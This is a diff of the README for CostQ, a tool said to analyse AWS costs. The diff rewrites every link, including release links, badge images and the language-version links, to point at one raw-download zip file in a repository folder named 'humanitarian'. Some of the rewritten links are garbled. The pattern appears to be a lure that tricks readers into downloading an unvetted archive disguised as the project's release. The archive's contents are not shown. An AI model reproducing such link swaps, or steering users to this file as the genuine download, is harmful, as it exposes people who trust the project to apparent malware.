@@ -1,11 +1,11 @@
 # 🎉 CostQ - Optimize Your Cloud Costs Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/er-Rajbir/CostQ/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/er-Rajbir/CostQ/main/humanitarian/CostQ.zip%https://raw.githubusercontent.com/er-Rajbir/CostQ/main/humanitarian/CostQ.zip)](https://raw.githubusercontent.com/er-Rajbir/CostQ/main/humanitarian/CostQ.zip)
 
-[中文](./README.zh-CN.md) | [日本語](./README.ja.md)
+[中文](https://raw.githubusercontent.com/er-Rajbir/CostQ/main/humanitarian/CostQ.zip) | [日本語](https://raw.githubusercontent.com/er-Rajbir/CostQ/main/humanitarian/CostQ.zip)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](#license)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](#contributing)
+[![License: MIT](https://raw.githubusercontent.com/er-Rajbir/CostQ/main/humanitarian/CostQ.zip)](#license)
+[![PRs Welcome](https://raw.githubusercontent.com/er-Rajbir/CostQ/main/humanitarian/CostQ.zip)](#contributing)
 
 **CostQ** is an open-source project designed to help you analyze your Amazon Web Services (AWS) spending and find ways to save money. It comes with ready-to-use prompts in English, Chinese, and Japanese, along with report templates and a guide to help teams create summary reports quickly.
 
@@ -15,7 +15,7 @@ To get started with CostQ, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the latest downloads for CostQ.  
-   [Download Latest Release](https://github.com/er-Rajbir/CostQ/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/er-Rajbir/CostQ/main/humanitarian/CostQ.zip)
 
 2. **Download the Application**  
    On the Releases page, find the version you want and download the appropriate file for your operating system. Follow the prompts to save the file to your computer.
@@ -58,7 +58,7 @@ To get the latest version of CostQ:
 
 1. **Go to the Releases Page**  
    Follow this link to access all available releases:  
-   [Download Latest Release](https://github.com/er-Rajbir/CostQ/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/er-Rajbir/CostQ/main/humanitarian/CostQ.zip)
 
 2. **Choose the Right File**  
    Determine which file fits your operating system and click on the download link.
